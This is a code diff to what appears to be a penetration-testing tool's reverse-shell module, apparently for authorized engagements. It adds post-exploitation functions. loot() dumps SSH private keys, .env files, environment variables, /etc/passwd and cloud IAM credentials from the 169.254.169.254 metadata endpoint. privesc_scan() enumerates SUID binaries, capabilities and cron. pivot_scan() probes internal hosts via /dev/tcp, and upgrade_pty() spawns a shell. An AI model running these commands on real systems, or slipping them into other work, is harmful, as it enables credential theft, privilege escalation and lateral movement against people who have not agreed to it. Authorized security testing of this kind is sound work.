@@ -6,8 +6,9 @@ it, so a report shows ``id`` / ``whoami`` / a read secret instead of just
 Strix; a per-connection reader thread buffers output; tools write commands and
 drain output. No sandbox dependency, so it is testable over loopback.
 
-# ponytail: raw TCP, no PTY. Line-oriented shells (bash -i, nc) work; full-screen
-# TUIs (vim, top) don't. Add a PTY upgrade helper if an engagement needs it.
+# ponytail: raw TCP by default. Line-oriented shells (bash -i, nc) work;
+# full-screen TUIs (vim, top) don't. upgrade_pty is a best-effort python
+# spawn; if the target lacks python the session stays a line shell.
 """
 
 from __future__ import annotations
@@ -158,15 +159,20 @@ def shell_exec(session_id: str, command: str, read_timeout: float = 3.0) -> dict
     except OSError as e:
         sess.alive = False
         return {"success": False, "error": f"send failed: {e}"}
-    # Collect output until it goes quiet (a short idle gap) or the timeout hits.
+    # Collect until idle (one quiet poll after output, two if still empty) or timeout.
     deadline = time.time() + max(0.5, read_timeout)
     out = ""
     last_len = -1
+    quiet_polls = 0
     while time.time() < deadline:
         time.sleep(0.25)
         out += sess.drain()
-        if len(out) == last_len and out:
-            break  # no new bytes since last poll → command finished
+        if len(out) == last_len:
+            quiet_polls += 1
+            if out or quiet_polls >= 2:
+                break
+        else:
+            quiet_polls = 0
         last_len = len(out)
     return {"success": True, "session_id": session_id, "command": command, "output": out}
 
@@ -188,3 +194,136 @@ def close_shell(session_id: str | None = None, port: int | None = None) -> dict[
                 _sessions.pop(sid).close()
             return {"success": True, "closed_listener": port}
     return {"success": False, "error": "pass session_id or port"}
+
+
+# --- post-exploitation helpers: turn a raw shell into report-ready proof ---
+
+_LOOT_CAP = 2000
+
+# (label, command). Best-effort proof/loot — each runs through shell_exec; a
+# blank result just means the file/command wasn't there.
+_LOOT_COMMANDS: tuple[tuple[str, str], ...] = (
+    ("whoami", "whoami"),
+    ("id", "id"),
+    ("hostname", "hostname"),
+    ("uname", "uname -a"),
+    ("passwd", "head -40 /etc/passwd"),
+    ("sudo", "sudo -n -l 2>/dev/null"),
+    ("env", "env"),
+    ("ssh_dir", "ls -la ~/.ssh 2>/dev/null"),
+    ("ssh_key", "cat ~/.ssh/id_rsa 2>/dev/null"),
+    ("dotenv", "cat .env 2>/dev/null; cat ../.env 2>/dev/null"),
+    (
+        "cloud_creds",
+        "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/"
+        "security-credentials/ 2>/dev/null || wget -qO- --timeout=3 "
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
+    ),
+)
+# Labels whose non-empty output is inherently sensitive (worth surfacing).
+_HIGH_VALUE = frozenset({"ssh_key", "dotenv", "cloud_creds", "sudo"})
+
+_PRIVESC_COMMANDS: tuple[tuple[str, str], ...] = (
+    ("sudo", "sudo -n -l 2>/dev/null"),
+    ("suid", "find / -perm -4000 -type f 2>/dev/null | head -50"),
+    ("caps", "getcap -r / 2>/dev/null | head -30"),
+    ("cron", "ls -la /etc/cron* 2>/dev/null"),
+    ("world_writable", "find / -perm -0002 -type d 2>/dev/null | head -30"),
+    ("kernel", "uname -a; cat /etc/os-release 2>/dev/null | head -3"),
+)
+_DEFAULT_PIVOT_PORTS = (22, 80, 443, 445, 3306, 5432, 6379, 8080, 9200, 27017)
+_PIVOT_MAX = 200
+# Printed via `echo OPEN$((40+2))` so a shell that echoes the command isn't a hit.
+_PIVOT_OPEN = "OPEN42"
+
+
+def _safe_host(host: str) -> bool:
+    return bool(host) and len(host) <= 253 and all(c.isalnum() or c in ".-:" for c in host)
+
+
+def upgrade_pty(session_id: str) -> dict[str, object]:
+    """Best-effort PTY upgrade so sudo/interactive commands behave.
+
+    Depends on the target having python; falls back, leaving the raw shell usable.
+    """
+    if _sessions.get(session_id) is None:
+        return {"success": False, "error": f"no session {session_id}"}
+    cmd = (
+        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
+        "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null; export TERM=xterm"
+    )
+    out = shell_exec(session_id, cmd, read_timeout=3.0)
+    if not out.get("success"):
+        return out
+    return {
+        "success": True,
+        "session_id": session_id,
+        "output": out.get("output", ""),
+        "note": "PTY spawn attempted — if the target lacks python it stays a raw line shell",
+    }
+
+
+def _run_labeled(session_id: str, commands: tuple[tuple[str, str], ...]) -> dict[str, str] | None:
+    if _sessions.get(session_id) is None:
+        return None
+    results: dict[str, str] = {}
+    for label, cmd in commands:
+        resp = shell_exec(session_id, cmd, read_timeout=4.0)
+        if not resp.get("success"):
+            break
+        results[label] = str(resp.get("output", ""))[:_LOOT_CAP]
+    return results
+
+
+def loot(session_id: str) -> dict[str, object]:
+    """Grab proof/loot from a caught shell — creds, keys, identity, cloud creds."""
+    results = _run_labeled(session_id, _LOOT_COMMANDS)
+    if results is None:
+        return {"success": False, "error": f"no session {session_id}"}
+    high_value = sorted(label for label in _HIGH_VALUE if results.get(label, "").strip())
+    return {"success": True, "session_id": session_id, "loot": results, "high_value": high_value}
+
+
+def privesc_scan(session_id: str) -> dict[str, object]:
+    """Quick local privesc enumeration (SUID, sudo, caps, cron, kernel)."""
+    checks = _run_labeled(session_id, _PRIVESC_COMMANDS)
+    if checks is None:
+        return {"success": False, "error": f"no session {session_id}"}
+    notable: list[str] = []
+    if checks.get("sudo", "").strip():
+        notable.append("sudo: non-empty `sudo -l` — check for exploitable entries")
+    if checks.get("suid", "").strip():
+        notable.append("suid: SUID binaries present — check GTFOBins")
+    if checks.get("caps", "").strip():
+        notable.append("caps: file capabilities set — check for cap_setuid etc.")
+    return {"success": True, "session_id": session_id, "checks": checks, "notable": notable}
+
+
+def pivot_scan(
+    session_id: str, targets: list[str], ports: list[int] | None = None
+) -> dict[str, object]:
+    """From inside the shell, TCP-connect-test host:port pairs (internal pivot)."""
+    if _sessions.get(session_id) is None:
+        return {"success": False, "error": f"no session {session_id}"}
+    hosts = [h for h in targets if _safe_host(h)]
+    if not hosts:
+        return {"success": False, "error": "targets is required (hostnames/IPs, no metacharacters)"}
+    raw_ports = list(ports) if ports else list(_DEFAULT_PIVOT_PORTS)
+    port_list = [p for p in raw_ports if isinstance(p, int) and 1 <= p <= 65535]
+    if not port_list:
+        return {"success": False, "error": "ports must be integers 1-65535"}
+    pairs = [(h, p) for h in hosts for p in port_list][:_PIVOT_MAX]
+    open_ports: list[dict[str, object]] = []
+    for host, port in pairs:
+        cmd = f"timeout 1 bash -c 'echo > /dev/tcp/{host}/{port}' 2>/dev/null && echo OPEN$((40+2))"
+        resp = shell_exec(session_id, cmd, read_timeout=2.0)
+        if not resp.get("success"):
+            break
+        if _PIVOT_OPEN in str(resp.get("output", "")):
+            open_ports.append({"host": host, "port": port})
+    return {
+        "success": True,
+        "session_id": session_id,
+        "open": open_ports,
+        "tested": len(pairs),
+    }
